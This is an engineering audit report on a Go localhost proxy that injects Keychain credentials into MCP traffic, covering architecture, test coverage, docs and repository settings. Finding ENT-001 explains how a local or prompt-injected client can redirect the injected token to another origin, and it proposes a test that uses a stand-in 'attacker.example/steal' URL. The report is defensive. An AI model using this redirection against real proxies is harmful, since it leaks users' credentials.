# Entropy audit — mcpsafe (2026-08-22)

Full-mode audit (architecture, redundancy, change amplification, local quality, SDLC) plus explicit hygiene validation. First snapshot of this repository; no prior `docs/audits/` baseline.

## Executive summary

- **Snapshot:** `github.com/marcelocantos/mcpsafe` at `/Users/marcelo/work/github.com/marcelocantos/mcpsafe`. Branch `main` tracking `origin/main`. HEAD `169cebe72bcaf7ee9bf3a43756550a38c3df5f13` (`Add prototype reverse proxy with Keychain credential injection (#1)`, 2026-04-28). Initial `git status --porcelain=v1 -b`: clean (`## main...origin/main`). Date 2026-08-22. Default GitHub branch is `main` (fleet default is `master`).
- **Scope:** All tracked source, tests, example Starlark, wrapper script, `CLAUDE.md`, `bullseye.yaml`, `go.mod`/`go.sum`, GitHub repo settings reachable via `gh`. No generated or vendored trees in-repo. Local gitignored binary `./mcpsafe` excluded. Parent workspace `/Users/marcelo/work/github.com/marcelocantos/go.work` is outside this repo and is recorded only as a command limitation.
- **Headline mechanism:** A three-package localhost reverse proxy whose *variation* is a trusted Starlark script, but whose *outbound origin, HTTP client, and Starlark thread* are shared global machinery. The security claim (“MCP never sees the secret”) is implemented by injecting Keychain material into a request whose destination is not pinned to `-backend` / the script, then forwarding with `http.DefaultClient`. Tests cover Starlark host/query rewrite only; the proxy, Keychain, and FogBugz example are untested on the shipped path.
- **Highest-consequence findings:** ENT-001 (credentialed outbound origin is client- and environment-influenced), ENT-002 (one Starlark thread shared across `ServeHTTP` goroutines), ENT-003 (load-bearing properties have no shipped oracle).
- **Unverified residue:** Live FogBugz/`fogbugz-mcp` wire format (query vs JSON body); live absolute-form forwarding (not executed; would need a no-Keychain script); whether T1 should remain `converging` because the prototype is “not currently wired up”; whether this module should be added to the sibling `go.work`. No P0 demonstrated with a token-bearing exploit in this run.

## Scope and exclusions

**In scope:** `main.go`, `listener.go`, `keychain/`, `transform/`, `examples/fogbugz.star`, `scripts/fogbugz-mcp.sh`, `CLAUDE.md`, `bullseye.yaml`, `docs/TODO.md`, `LICENSE`, `.gitignore`, `go.mod`, `go.sum`, GitHub settings for `marcelocantos/mcpsafe`.

**Excluded by name:**

- `./mcpsafe` — gitignored local build artifact.
- Module cache copies of `go.starlark.net` and `golang.org/x/sys` — not vendored here; consulted only for library contracts.
- `/Users/marcelo/work/github.com/marcelocantos/go.work` — sibling workspace; not part of this repo.

No `vendor/`, generated codegen, fixtures, or snapshot corpora exist.

## Commands run

Shipped-path checks used `GOWORK=off`. Ambient `go env GOWORK` is `/Users/marcelo/work/github.com/marcelocantos/go.work`, which `use`s only `./claudia` and `./jevons`. Without `GOWORK=off`, `go build ./...` / `go test ./...` fail with `directory prefix . does not contain modules listed in go.work` (exit 1). That is an environment limitation, not an in-repo `go.work`.

| Command | Tool version | Exit | Shipped vs auxiliary | Notes / limitations |
|---|---|---|---|---|
| `git status --porcelain=v1 -b`; `git rev-parse HEAD`; `git log` | git (repo) | 0 | provenance | Clean tree; 4 commits; branch `main`. |
| `go version`; `go env GOOS GOARCH CGO_ENABLED` | go1.26.4 darwin/arm64; CGO=1 | 0 | env | `go.mod` requires `go 1.25.7`. |
| `GOWORK=off go build -o /tmp/mcpsafe-audit-bin .` | go1.26.4 | 0 | shipped | Matches `CLAUDE.md` build once GOWORK is disabled. `go build ./...` is the documented form. |
| `GOWORK=off go test -count=1 -v ./...` | go1.26.4 | 0 | shipped | 3 tests in `transform`; `main` and `keychain` have no test files. |
| `GOWORK=off go test -race -count=1 ./...` | go1.26.4 | 0 | shipped | Does not exercise `ServeHTTP` or concurrent `Apply`. |
| `GOWORK=off go vet ./...` | go1.26.4 | 0 | shipped | No findings. |
| `GOWORK=off go test -cover ./...` | go1.26.4 | 0 | shipped | `main` 0.0%, `keychain` 0.0%, `transform` 38.0%, statements 22.1%. |
| `GOWORK=off go tool cover -func` | go1.26.4 | 0 | shipped | `ServeHTTP`, `Get`, `readKeychain`, `builtinKeychain`, `isJSON`, body converters all 0%. `Load` 88.9%, `Apply` 56.4%. |
| `GOWORK=off gofmt -l .` | go1.26.4 | 0 | shipped | Empty (formatted). |
| `GOWORK=off go mod tidy -diff` | go1.26.4 | 1 | auxiliary | Would promote `go.starlark.net` to direct; add `google.golang.org/protobuf` and `github.com/google/go-cmp` to `go.sum`. Not applied. |
| `GOWORK=off go list -f imports ./...` | go1.26.4 | 0 | shipped | `main → keychain, transform`; `transform → keychain, starlark`. No cycles. |
| `GOWORK=off GOOS=linux CGO_ENABLED=0 go build .` (also windows; darwin `CGO_ENABLED=0`) | go1.26.4 | 1 | auxiliary | `undefined: readKeychain`. Darwin/cgo is required. |
| `GOWORK=off golangci-lint run ./...` | 2.12.2 | 0 | auxiliary | 10 issues (9 errcheck, 1 SA1019 `starlark.ExecFile` deprecated). Exit 0 despite findings (linter non-blocking default). |
| `GOWORK=off staticcheck ./...` | 2025.1.1 (built go1.25.0) | 1 | auxiliary | Failed to compile stdlib: module wants go1.25.7 / files need go1.26. Unusable here. |
| `/tmp/mcpsafe-audit-bin -version` / `-help-agent` / no `-config` | built this run | 0 | shipped | Prints `mcpsafe dev`; agent help; requires `-config`. |
| `/tmp/mcpsafe-audit-bin -config examples/fogbugz.star -backend https://example.invalid -addr 127.0.0.1:0` | built this run | killed after listen | shipped | Printed `mcpsafe listening on http://127.0.0.1:53718`. Load path works; no request sent (would hit Keychain). |
| `bash -n scripts/fogbugz-mcp.sh` | bash | 0 | shipped | Syntax only; does not run `npx` or start the wrapper. |
| `gh repo view`; merge settings; branch protection; code scanning; vulnerability-alerts | gh | mixed | auxiliary | Public; squash-only + delete-branch; **no** branch protection; **no** workflows; secret scanning + push protection enabled; Dependabot alerts **disabled**; no code-scanning analysis. |
| `~/.claude/skills/hygiene/hygiene_check.py` | n/a | not run | — | `hygiene.yaml` absent; per skill, do not initialize. |

Unavailable (not installed, not added): `govulncheck`, `deadcode`, `jscpd`. Clone/dead-code conclusions are from full read of the 800-line tracked corpus, not a detector.

## Dimension vector

| Dimension | State | Evidence summary | Change from baseline |
|---|---|---|---|
| Architecture topology | healthy | Three packages, acyclic `main → {transform, keychain}`, `transform → keychain`. Starlark is the intended variation point. `listener.go` is a no-op file, not a layering violation. | n/a (first full audit) |
| Redundancy / sources of truth | concern | FogBugz token site is query-param in `CLAUDE.md` / `bullseye.yaml` / `-help-agent`, JSON body in `examples/fogbugz.star`. Keychain described as `security` CLI, implemented as Security.framework. | n/a |
| Change amplification | healthy | Two contentful commits; no co-change hubs. Next backend is a new `.star` file unless origin-pinning stays in `ServeHTTP`. Docs/acceptance must be edited in three places for one FogBugz fact (ENT-004). | n/a |
| Local code quality | concern | Hand-rolled reverse proxy (errcheck on `io.Copy`/`Close`), deprecated `ExecFile`, shared thread, ignored `SetKey` errors. `gofmt`/`vet` clean. Small linear functions, not over-decomposed. | n/a |
| Correctness / verification | critical | Load-bearing inject/forward/Keychain paths: 0% coverage. Three unit tests decide only Load-missing-transform, host rewrite, method preserve. No httptest, no fake Keychain, no example-script test, no CI. | n/a |
| Security / dependencies | concern | Localhost default bind is sound. Outbound host not pinned; `DefaultClient` uses `ProxyFromEnvironment` and follows redirects. No vuln scan. `golang.org/x/sys` is a 2022 pseudo-version, transitive of Starlark. | n/a |
| Build / release / operations | concern | Darwin+cgo only; no `!darwin` stub; no CI; `version = "dev"`; no tags/releases; `CLAUDE.md` build fails under the org `go.work`. | n/a |
| Documentation / governance | concern | No README; `CLAUDE.md` Delivery “Merged to master” vs branch `main`; T1 still `converging` with stale `last_evaluated`; `docs/TODO.md` present; no `AGENTS.md`/`hygiene.yaml`. GitHub squash settings already match fleet. | n/a |

Do not collapse this vector to a scalar.

## Observed architecture

```
MCP client (e.g. fogbugz-mcp via scripts/fogbugz-mcp.sh)
    HTTP localhost
mcpsafe main (flags, listen, proxy.ServeHTTP)
    → transform.Script.Apply  (Starlark transform + keychain builtin)
        → keychain.Store.Get  (in-memory cache)
            → readKeychain    (cgo SecItemCopyMatching, darwin)
    → http.DefaultClient.Do   (real backend)
```

**Entry points:** `main.main` (`-config` required, `-addr` default `127.0.0.1:0`, `-backend` optional, `-version`, `-help-agent`). Wrapper `scripts/fogbugz-mcp.sh` builds/runs the binary then `exec npx fogbugz-mcp`.

**Packages:** `github.com/marcelocantos/mcpsafe` (CLI + HTTP proxy), `…/transform` (Starlark), `…/keychain` (cache + darwin cgo). Public integration surface is the CLI and the Starlark `transform(req)` dict (`host`, `scheme`, `path`, `query`, `headers`, `method`, optional `body`).

**Dependency direction (observed, `go list`):** acyclic. High fan-in: none at this size. Cross-cutting: Keychain cache (`sync.RWMutex`, sound); HTTP client (global `DefaultClient`); Starlark thread (one per `Script`, unsound under `http.Server` concurrency).

**Declared vs observed:**

| Rule | Kind |
|---|---|
| Bind localhost by default | declared (`-addr` default) and observed |
| Secrets from macOS Keychain, cached in process | declared and observed (`Store.Get`) |
| Starlark defines per-backend rewrite | declared and observed |
| FogBugz auth is `&token=` query | **declared** (`CLAUDE.md`, T1, help text); **contradicted** by `examples/fogbugz.star` (JSON body) |
| Keychain via `security find-generic-password` | **declared**; **observed** `SecItemCopyMatching` |
| Host rewrite to configured backend | **declared**; **observed** only when `URL.Host` is empty or equals `Request.Host`, and only if the script does not set `host`. The FogBugz example does not set `host`. |
| Delivery = merged to master | **declared** in `CLAUDE.md`; **observed** default branch `main` |
| Darwin-only Keychain | inferred from `_darwin.go` filename and missing stub; commit message says darwin-only |

**Unknown intent:** whether outbound origin should be exclusively `-backend` + script (recommended for the threat model) or whether client-absolute-form URIs are a supported “HTTP proxy” mode; whether T1 stays `converging` until wired into daily MCP config.

## Findings

### ENT-001: Credentialed outbound origin is not pinned

- **Priority:** P1
- **Dimensions:** Security / dependencies; Architecture topology; Correctness / verification
- **Status:** observed fact (control flow); inference (that a typical `fogbugz-mcp` client will send absolute-form URIs)
- **Evidence:**
  - `main.go:91-98` applies `-backend` host only when `r.URL.Host == ""` or `r.URL.Host == r.Host`.
  - `main.go:107-113` then requires *some* host, not *the configured* host.
  - `main.go:124` `http.DefaultClient.Do(outReq)` — `DefaultTransport.Proxy` is `ProxyFromEnvironment` (`net/http/transport.go` in go1.26.4).
  - `examples/fogbugz.star:13-16` injects `keychain("fogbugz-token")` into JSON `body` and does **not** set `host`.
  - Go server parses Request-Line with `url.ParseRequestURI` (`net/http/request.go`); an absolute-form target puts attacker host in `r.URL.Host` while `r.Host` stays the listen address, so the backend default is skipped, then the script still injects the secret.
  - Default listen `127.0.0.1:0` (`main.go:22`) — remote SSRF is out; the MCP process on localhost is the intended untrusted party.
- **Mechanism:** The product exists so the MCP never holds the token. Injection happens *before* forward, against whatever origin survived the partial default. `HTTPS_PROXY`/`HTTP_PROXY` in the environment additionally divert the credentialed request. `DefaultClient` follows 3xx (up to 10). 307/308 body replay is *not* automatic here: JSON rewrite wraps the body in `io.NopCloser`, so `GetBody` is nil and Go will not resend the body (counterevidence below).
- **Blast radius:** Any local client of the listen port, including a prompt-injected MCP, can aim the injected token at an origin the operator did not configure, or at an HTTP proxy from the environment.
- **Counterevidence checked:** Localhost bind; smoke start used `-backend https://example.invalid` and did not send a request; 307 body-follow requires `GetBody`; relative-URI clients (`POST /api` + `Host: 127.0.0.1:port`) *do* take the backend host. No live token was sent in this audit.
- **Smallest coherent remediation:** Treat `-backend` (or script `host`/`scheme`) as the only allowed origin. Ignore inbound `URL.Host` for targeting. Use a dedicated `http.Client` with `Transport.Proxy = nil`, `CheckRedirect: err` (or `httputil.ReverseProxy` whose `Director` pins the origin). Optionally refuse if the script did not set host and `-backend` is empty.
- **Verification:** `httptest` that sends `POST https://attacker.example/steal` to the proxy with `-backend https://good.example` and a script that injects a marker; assert the captured outbound host is `good.example` and that `HTTP_PROXY` is ignored. Must fail if the predicate in `main.go:95` returns.
- **Ratchet candidate:** That httptest in CI (`go test ./...` job). Hygiene item `security.outbound-origin-pin` later, if hygiene is declared.

### ENT-002: One Starlark thread is shared across HTTP goroutines

- **Priority:** P1
- **Dimensions:** Correctness / verification; Local code quality
- **Status:** observed fact
- **Evidence:**
  - `transform/transform.go:32-34` — `Load` allocates a single `starlark.Thread` on `Script`.
  - `transform/transform.go:114` — `Apply` calls `starlark.Call(s.thread, …)` on that thread.
  - `main.go:57-67` — one `Script` is the `http.Handler`; `http.Serve` runs `ServeHTTP` per request on its own goroutine.
  - `go.starlark.net` impl notes that frozen module globals are shareable across threads; a `Thread` itself holds `stack`, `Steps`, `locals` (`starlark/eval.go` `Thread` struct). Concurrent `Call` on one `Thread` is a data race.
  - `keychain.Store` *is* locked (`keychain/keychain.go:23-31`); the race is not the cache.
  - `go test -race` is green because tests never concurrent-`Apply` and never call `ServeHTTP`.
- **Mechanism:** Concurrent MCP requests interleave evaluator stack mutation. Effects: panic, mixed transform I/O, or corrupted request dicts (including bodies that may contain the token).
- **Blast radius:** All live traffic through one `mcpsafe` process. FogBugz MCP is typically low-QPS; still a race, not a load bug.
- **Counterevidence checked:** No mutex around `Apply`. No per-request `Thread`. Globals are frozen after `ExecFile` (safe to share); the thread is not.
- **Smallest coherent remediation:** Create a new `starlark.Thread` per `Apply` (or `sync.Mutex` around `Call` if scripts are assumed tiny). Keep one compiled `globals`.
- **Verification:** `t.Parallel` / `errgroup` of many `Apply` calls under `-race`; must be silent after the fix and red if the shared thread returns.
- **Ratchet candidate:** `go test -race ./...` in CI plus a named concurrent test.

### ENT-003: Load-bearing product path has no shipped oracle

- **Priority:** P1
- **Dimensions:** Correctness / verification; Build / release / operations
- **Status:** observed fact
- **Evidence:**
  - Tests: `TestLoadMissingTransform`, `TestApplyHostRewrite`, `TestApplyPreservesMethod` only (`transform/transform_test.go`).
  - Cover: `ServeHTTP` 0%, `parseBackend` 0%, `Get`/`readKeychain` 0%, `builtinKeychain` 0%, `isJSON`/`goToStarlark`/`starlarkToGo` 0%. `examples/fogbugz.star` is never `Load`ed in tests. `scripts/fogbugz-mcp.sh` has no test.
  - `keychain.Store.Get` always calls package-level `readKeychain` — no seam to stub in tests.
  - Commit `169cebe` claims “Working end-to-end against FogBugz” and “Parked as a working prototype — not currently wired up.” That e2e is not encoded as a test, journey, or CI job.
  - No `.github/workflows`. `go test ./...` is documented in `CLAUDE.md:42-45` but not gated.
- **Mechanism:** The properties T1 lists (Keychain read, cache, host rewrite, token inject, forward) can regress while the three unit tests stay green. Coverage % is a locator; the gap is *which properties are decided*.
- **Blast radius:** Any change to `ServeHTTP`, Keychain, or the FogBugz script is unguarded. ENT-001/002 cannot fail CI today.
- **Counterevidence checked:** Transform host/query rewrite *is* tested and would catch a total `Apply` break. Smoke start showed `Load` of `examples/fogbugz.star` succeeds. That is not injection or forward.
- **Smallest coherent remediation:** (1) Inject a `readKeychain` func (or small interface) on `Store` for a fake. (2) `httptest` server as upstream + `httptest` client through `proxy.ServeHTTP` asserting host pin + injected marker. (3) `Load("examples/fogbugz.star")` and `Apply` a JSON POST. Owner-visible journey (wrapper + dummy upstream) once the binary is wired; until then the httptest *is* the product slice.
- **Verification:** The new tests fail if injection or origin pin breaks; CI runs `GOWORK=off go test ./...`.
- **Ratchet candidate:** CI job `test` on push; later hygiene `correctness.unit` / `correctness.proxy-httptest`.

### ENT-004: FogBugz token injection has three competing truths

- **Priority:** P2
- **Dimensions:** Redundancy / sources of truth; Documentation / governance; Change amplification
- **Status:** observed fact
- **Evidence:**
  - Query-param: `CLAUDE.md:16`, `CLAUDE.md:24-27`, `CLAUDE.md:37`; `bullseye.yaml:14` “Appends `&token=<credential>` to query params”; `main.go:162-166` (`-help-agent` example).
  - JSON body: `examples/fogbugz.star:3-5,13-16`; `scripts/fogbugz-mcp.sh:43-45` (“fogbugz-mcp sends the token in requests; mcpsafe overwrites it”).
  - Keychain *how*: `CLAUDE.md:14` and `bullseye.yaml:11` say `security find-generic-password`; `keychain/keychain_darwin.go:45` is `SecItemCopyMatching`.
  - `CLAUDE.md:30-31` omits `body` from the documented `req` keys; `Apply` implements `body` (`transform/transform.go:110-111,163-177`).
- **Mechanism:** A FogBugz MCP change (query vs POST JSON) requires coordinated edits of docs, T1 acceptance, help text, and the example. They have already drifted; following `CLAUDE.md` yields a script that does not match `fogbugz-mcp`.
- **Blast radius:** Operators and agents authoring scripts; T1 achievement criteria are not the shipped example.
- **Counterevidence checked:** Both injection sites are *supported* by `Apply` (query and body). The defect is competing *product* truth for FogBugz, not two validators. `security add-generic-password` in the example is provisioning, which the CLI still does; only *read* is cgo.
- **Smallest coherent remediation:** Pick the FogBugz wire format from `fogbugz-mcp` (live residue) and make `CLAUDE.md`, T1 acceptance, and `-help-agent` show that script. Document Keychain *read* as Security.framework.
- **Verification:** A test that `Load`s `examples/fogbugz.star` plus a grep-or-test that help text and the example agree on `body` vs `query`.
- **Ratchet candidate:** Test loading the example; optional `file:` hygiene evidence that `CLAUDE.md` mentions `req["body"]` if that remains the format.

### ENT-005: Hand-rolled reverse proxy drops stdlib invariants

- **Priority:** P2
- **Dimensions:** Local code quality; Security / dependencies
- **Status:** observed fact
- **Evidence:**
  - `main.go:115-137`: clone headers, `Del("Host")`, `DefaultClient.Do`, copy response headers, `WriteHeader`, `io.Copy` (error ignored). golangci-lint errcheck: `listener.Close`, `resp.Body.Close`, `io.Copy`, `req.Body.Close`, several `SetKey`.
  - No hop-by-hop stripping (`Connection`, `Keep-Alive`, `Transfer-Encoding`, `TE`, `Trailer`, `Upgrade`).
  - No `http.Server` `ReadHeaderTimeout`; `DefaultClient` timeout is zero.
  - JSON path `transform/transform.go:79-81` reads the whole body with no size cap.
  - `starlark.ExecFile` is deprecated (SA1019) at `transform/transform.go:41`.
- **Mechanism:** Bugs stdlib `httputil.ReverseProxy` already treats (hop-by-hop loops, flush, trailer, truncated copy reported as success) are reintroduced. Hanging upstream hangs the MCP. Large JSON bodies are unbounded memory.
- **Blast radius:** Every proxied request. Localhost-only reduces remote slowloris.
- **Counterevidence checked:** For a prototype this size, a 50-line `ServeHTTP` is readable; `ReverseProxy` is not required for *clarity*. The issue is omitted protocol invariants, not length. `gofmt`/`vet` clean.
- **Smallest coherent remediation:** `httputil.ReverseProxy` with `Director` applying transform + origin pin, `ErrorHandler`, and a `Client`/`Transport` with timeouts and `Proxy: nil`. Cap JSON `ReadAll`. Per-`Apply` thread (ENT-002) still required in `Director`.
- **Verification:** Tests for hop-by-hop not forwarded; truncated upstream body surfaces as error; timeout test with a non-responding server.
- **Ratchet candidate:** errcheck in golangci (blocking) once CI exists; httptest for hop-by-hop.

### ENT-006: Keychain is darwin/cgo-only with no compile stub

- **Priority:** P2
- **Dimensions:** Build / release / operations
- **Status:** observed fact
- **Evidence:**
  - `keychain/keychain.go:38` calls `readKeychain` with no build tag.
  - `readKeychain` lives only in `keychain/keychain_darwin.go` (cgo `Security`/`CoreFoundation`). `go list` on `./keychain`: `CgoFiles=[keychain_darwin.go]`, no ignored files, no `//go:build` tags in the repo.
  - `GOWORK=off GOOS=linux CGO_ENABLED=0 go build .` → `undefined: readKeychain` (same for windows; same for darwin `CGO_ENABLED=0`).
  - Fleet CLI convention lists Linux/Windows release platforms; this binary cannot be those without a stub.
- **Mechanism:** First non-darwin CI job or `GOWORK=off go test` on GitHub `ubuntu-latest` fails at compile, not at a clear `ErrNotDarwin`.
- **Blast radius:** CI matrix, `go install` on Linux, cgo-disabled builds.
- **Counterevidence checked:** Product is macOS Keychain by design (`CLAUDE.md`, commit message). A stub is not feature work; it is a compile contract. Darwin smoke build succeeded.
- **Smallest coherent remediation:** `keychain_stub.go` with `//go:build !darwin || !cgo` returning a typed error. Keep cgo file `//go:build darwin && cgo`.
- **Verification:** `GOOS=linux CGO_ENABLED=0 go test ./...` compiles and `Get` returns the stub error.
- **Ratchet candidate:** CI `go test` with that env on Linux, plus darwin job for the real cgo path.

### ENT-007: Public credential proxy has no CI, README, or vulnerability alerts

- **Priority:** P2
- **Dimensions:** Build / release / operations; Documentation / governance; Security / dependencies
- **Status:** observed fact
- **Evidence:**
  - No `.github/`, `gh workflow list` empty, `gh release list` empty.
  - No `README*`. GitHub description exists; clone visitors get LICENSE + `CLAUDE.md`.
  - `gh api …/vulnerability-alerts` → disabled. Dependabot security updates disabled. Code scanning “no analysis found”. Branch `main` **not protected**.
  - Secret scanning and push protection **enabled**. Merge settings: squash-only, delete branch, `allow_merge_commit=false` — already fleet-correct.
  - `version = "dev"` (`main.go:19`) never injected.
- **Mechanism:** ENT-001–003 have no standing enforcement. A public repo that handles API tokens has no automated test or advisory pipeline. Missing README is how humans miss the localhost-only threat model.
- **Blast radius:** Future pushes, external clones, supply-chain advisories on `go.starlark.net` / `x/sys`.
- **Counterevidence checked:** Prototype parked; squash-merge already set; secret scanning on. Absence of CI is not “tests don’t exist” (they do, locally).
- **Smallest coherent remediation:** README (what it is, localhost, Keychain, example); GitHub Actions `GOWORK=off go test ./...` on macOS (cgo) + Linux compile-stub (after ENT-006); enable Dependabot/govulncheck when CI exists. Do not invent TOML.
- **Verification:** Workflow file present and green; `gh api repos/…/vulnerability-alerts` not 404-disabled.
- **Ratchet candidate:** hygiene items `correctness.ci-test`, `docs.readme`, `security.dependabot` *after* the owner declares hygiene.

### ENT-008: Intent ledger and delivery docs disagree with the tree

- **Priority:** P2
- **Dimensions:** Documentation / governance
- **Status:** observed fact
- **Evidence:**
  - `bullseye.yaml`: T1 `status: converging`, `last_evaluated: d2c87c5` (the LICENSE-only initial commit). HEAD is `169cebe` with the prototype. Acceptance still lists query-param token (ENT-004).
  - `CLAUDE.md:51-53` Delivery: “Merged to master.” Default branch is `main` (`gh` + `git`).
  - `docs/TODO.md` exists; fleet `AGENTS.md` bans TODO files in favour of bullseye targets. The only item is generic token provisioning (not a competing implementation).
  - No `AGENTS.md` in-repo.
- **Mechanism:** Agents reading T1/Delivery/TODO will plan work the tree already did, or target `master`. `last_evaluated` never moved with the prototype commit.
- **Blast radius:** Agent/session planning; not runtime.
- **Counterevidence checked:** Commit message explicitly parks the prototype (“not currently wired up”) — keeping T1 `converging` may be *intentional* until MCP is wired. That intent is not written on T1. TODO content is a real future feature, just in the wrong ledger.
- **Smallest coherent remediation:** Refresh T1 acceptance to the body-token example (or reopen a child for “wired into daily MCP”). Set `last_evaluated` on the next real bullseye commit. Replace Delivery with “merged to `main`” or rename the branch. Promote TODO into a target and delete `docs/TODO.md`. Owner residue: achieve vs keep converging.
- **Verification:** `bullseye.yaml` SHA matches HEAD policy the owner chooses; no `docs/TODO.md`; Delivery names the real default branch.
- **Ratchet candidate:** manual/bullseye validate; not a CI compile gate.

### ENT-009: Direct Starlark import marked `// indirect`

- **Priority:** P3
- **Dimensions:** Build / release / operations
- **Status:** observed fact
- **Evidence:** `go.mod:5-8`; `transform/transform.go:17` imports `go.starlark.net/starlark`. `GOWORK=off go mod tidy -diff` promotes `go.starlark.net` to a direct `require` and keeps `golang.org/x/sys` indirect (2022-07-15 pseudo-version).
- **Mechanism:** `go mod tidy` in CI would rewrite `go.mod`/`go.sum` as a surprise diff. Indirect pin hides that Starlark is a first-class dependency.
- **Blast radius:** Module graph / reviews only.
- **Counterevidence checked:** Current `go.sum` is enough to build and test this module. `x/sys` age is Starlark’s transitive choice, not an extra in-repo copy.
- **Smallest coherent remediation:** `go mod tidy` (when the owner wants a code change). Do not bump `x/sys` unprompted without Starlark’s graph.
- **Verification:** `go mod tidy -diff` empty.
- **Ratchet candidate:** CI step `go mod tidy -diff`.

### ENT-010: `listener.go` is a no-op wrapper

- **Priority:** P3
- **Dimensions:** Local code quality
- **Status:** observed fact
- **Evidence:** `listener.go:8-10` is `return net.Listen("tcp", addr)`. Single caller `main.go:59`. No tests, no build tags, no TLS/socket variation.
- **Mechanism:** A file suggesting a seam that does not exist. Future unix-socket/TLS work would belong here; today it is indirection without variation.
- **Blast radius:** Negligible. Flagged so it is not mistaken for an extra deployable.
- **Counterevidence checked:** Could be a planned test hook. No `Listener` injection exists.
- **Smallest coherent remediation:** Inline `net.Listen` until a second implementation exists; or inject `net.Listener` in tests (would help ENT-003).
- **Verification:** Either file gone with tests still using `net.Listen`, or a second implementation with a test.
- **Ratchet candidate:** none until a second listen path is real.

## Redundancy and competing-source-of-truth inventory

| Fact | Owners | Drift |
|---|---|---|
| FogBugz token location | `CLAUDE.md`, T1 acceptance, `-help-agent` vs `examples/fogbugz.star` | **Yes** — query vs JSON body (ENT-004) |
| How Keychain is read | docs: `security` CLI vs code: `SecItemCopyMatching` | **Yes** — docs (ENT-004) |
| Default backend host | `-backend` flag vs script `req["host"]` vs inbound `URL.Host` | **Yes** — client can win (ENT-001) |
| `req` dict shape | `CLAUDE.md` keys vs `Apply` implementation | **Yes** — `body` undocumented |
| Default git branch | fleet `master`, `CLAUDE.md` Delivery vs GitHub `main` | **Yes** (ENT-008) |
| Starlark version | `go.mod` require vs org `go.work` (claudia/jevons pull a different pseudo-version when GOWORK is on) | Ambient; in-repo pin is consistent when `GOWORK=off` |
| Keychain cache | single `Store` map with mutex | **No** — one authority |
| Transform bytecode | one `Script.globals` after `Load` | **No** |

Deliberate duplication: `printAgentHelp` vs `CLAUDE.md` example (same query-token snippet). Coupling those two is fine; coupling them to `examples/fogbugz.star` is the missing step.

## Healthy structure and deliberate exceptions

- **Localhost default bind** (`main.go:22`) matches the threat model (secrets stay off the LAN). Smoke start listened on `127.0.0.1`.
- **Starlark as the backend variation point** — Go packages do not switch on product names; `examples/fogbugz.star` is data. Tests that rewrite host/query show that seam works (`transform/transform_test.go:32-63`).
- **Keychain cache locking** — double-checked locking in `keychain/keychain.go:20-43` is correct; this audit tried to find a cache race and did not.
- **Dummy MCP token** — `scripts/fogbugz-mcp.sh:45` sets `FOGBUGZ_TOKEN=proxied` so the MCP never needs the real secret.
- **Platform split** — cgo isolated in `keychain_darwin.go`, not sprinkled through `main`. Missing is the complementary stub (ENT-006), not the split itself.
- **License/SPDX** — Apache-2.0 `LICENSE`; source headers `Copyright 2026 Marcelo Cantos` / `SPDX-License-Identifier: Apache-2.0`.
- **GitHub merge policy** — squash-only, no merge commits, delete branch on merge, already matches fleet conventions.
- **Secret scanning + push protection** enabled on the public repo.
- **gofmt / go vet** clean on the shipped path (`GOWORK=off`).
- **Starlark sandbox** — `Thread.Load` is nil; builtins are only `keychain`. Scripts cannot `open()` the filesystem via the default universe.

## Hygiene posture

**Hygiene posture not declared.** There is no `hygiene.yaml`. Per the hygiene skill, it was not initialized and `hygiene_check.py` was not run.

Overlap with entropy (do not double-count as hygiene drift): ENT-003/007 are the missing steady-state gates; ENT-009 would be `go mod tidy -diff`; ENT-006 the Linux compile contract.

Findings that become hygiene items *after* the owner onboards (do not write the file in this audit): `correctness.unit` (`go test ./...`), `correctness.race`, `build.gofmt`, `docs.license` (already true), `docs.readme` (missing), `security.secret-scan` (GitHub enabled — `gh_setting`/`scanner` evidence), `vcs.squash-only` (already true), `security.dependabot` (currently disabled). Floors should start honest (many dimensions at 0) rather than aspirational.

## Oracle coverage and residue

| Property | Decided by |
|---|---|
| Module compiles on darwin/cgo | shipped `go build` this run |
| `gofmt` / `go vet` | shipped this run |
| Script without `transform` fails `Load` | shipped unit test |
| Starlark can rewrite host + add query | shipped unit test |
| Method preserved when script is identity | shipped unit test |
| Example script parses | shipped smoke start (Load + listen), not `go test` |
| Token injected from Keychain | **nothing** |
| Keychain miss/error path | **nothing** |
| Cache hit skips cgo | **nothing** |
| HTTP forward + status/body copy | **nothing** |
| Outbound origin pin / ignore `HTTP_PROXY` | **nothing** (ENT-001) |
| Concurrent `Apply` | **nothing** (ENT-002); `-race` does not hit it |
| `fogbugz.star` body inject | **nothing** |
| Wrapper starts proxy + `npx` | **nothing** (would be a journey; needs network + Keychain) |
| Non-darwin compile error message | **nothing** (fails undefined symbol) |
| Starlark/osv vulnerabilities | **nothing** (govulncheck absent; Dependabot off) |
| staticcheck | failed (toolchain skew) — not a product oracle |

**Owner residue (intent, not mechanical leftover):**

1. Should T1 stay `converging` until mcpsafe is wired into daily MCP, or is the prototype enough to achieve with a tighter acceptance line?
2. Is client-absolute-form URI a supported proxy mode, or always a bug (ENT-001 recommendation assumes bug)?
3. Confirm live `fogbugz-mcp` wire format (body vs query) before converging ENT-004.
4. Should `mcpsafe` be added to `/Users/marcelo/work/github.com/marcelocantos/go.work` so documented `go test ./...` works in the org workspace?
5. Darwin-only forever, or stub + Linux CI compile-only?

Failed/skipped checks: ambient `go test ./...` without `GOWORK=off`; `staticcheck ./...`; `govulncheck` not installed; `hygiene_check.py` not applicable; live Keychain/FogBugz not invoked.

## Remediation sequence

1. **Oracle seam:** fake Keychain + `httptest` proxy tests for origin pin, injection, and concurrent `Apply` under `-race` (ENT-003, enables ENT-001/002).
2. **Pin outbound origin** and replace `DefaultClient` with a `Client` that does not use env proxy or follow redirects (ENT-001). Per-request Starlark thread (ENT-002). Same PR is coherent.
3. **Converge FogBugz truth** in `CLAUDE.md`, T1, and `-help-agent` to the example (ENT-004). Owner decides T1 status (ENT-008).
4. **`!darwin` stub** so Linux CI can compile (ENT-006). `go mod tidy` (ENT-009) when that PR touches `go.mod`.
5. **Ratchet:** macOS `go test` + Linux stub compile workflow; README; enable Dependabot. Declare `hygiene.yaml` only if the owner asks to onboard, floors matching reality.
6. **Defer:** `ReverseProxy` rewrite (ENT-005) once origin pin exists; inline `listener.go` opportunistically; wrapper journey when the product is actually wired.

Do not apply this sequence in the audit. Re-run this report’s commands and finding IDs against the same definitions after remediation.
